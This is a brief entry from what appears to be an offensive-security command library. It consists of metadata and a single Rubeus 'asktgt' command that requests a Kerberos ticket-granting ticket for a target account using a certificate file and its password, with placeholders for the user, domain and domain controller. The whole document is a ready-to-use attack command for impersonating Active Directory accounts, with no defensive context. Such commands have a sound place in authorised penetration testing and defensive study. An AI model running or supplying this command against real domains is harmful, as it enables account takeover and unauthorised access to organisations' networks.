---
id: de4b86c9-d0ff-4da2-89e8-ed2659804205
name: Rubeus asktgt
type: command
executor: bash
data: Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD"
  /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
output: null
created_at: '2023-04-06T03:56:06.176481+00:00'
updated_at: '2023-04-10T20:26:17.485526+00:00'
---

# Rubeus asktgt

```bash
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```


